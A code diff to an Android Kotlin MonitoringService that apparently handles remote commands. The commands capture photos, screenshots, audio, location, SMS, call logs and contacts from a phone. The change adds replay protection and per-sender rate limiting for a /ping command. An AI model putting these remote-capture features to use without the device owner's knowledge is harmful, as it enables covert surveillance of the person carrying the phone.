@@ -132,10 +132,11 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
-        private val NO_REPLAY_COMMANDS = MUTATING_COMMANDS + "/smsconfirm"
+        private val NO_REPLAY_COMMANDS = MUTATING_COMMANDS + "/smsconfirm" + "/ping"
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val MUTATING_MAX_AGE_SEC = 300L
+        private const val PING_RATE_WINDOW_MS = 30_000L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
         private const val MAX_VIDEO_KEPT = 3
@@ -613,6 +614,11 @@ class MonitoringService : Service() {
     }
 
     private val pairHintAt = java.util.concurrent.atomic.AtomicLong(0L)
+    private val pingRate = object : LinkedHashMap<String, Long>(64, 0.75f, true) {
+        override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Long>): Boolean {
+            return size > 64
+        }
+    }
 
     private suspend fun sendPairHint(senderId: String) {
         try {
@@ -1476,6 +1482,12 @@ class MonitoringService : Service() {
                 }
             }
             "/ping" -> {
+                if (!senderOk) return
+                val pingKey = senderId.ifEmpty { "unknown" }
+                val nowPing = android.os.SystemClock.elapsedRealtime()
+                val lastPing = try { synchronized(pingRate) { pingRate[pingKey] } } catch (_: Exception) { null }
+                if (lastPing != null && nowPing - lastPing < PING_RATE_WINDOW_MS) return
+                try { synchronized(pingRate) { pingRate[pingKey] = nowPing } } catch (_: Exception) { }
                 when (arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)) {
                     "camera", "photo" -> {
                         if (senderOk && !wakeSeen) restartCameraLoop()
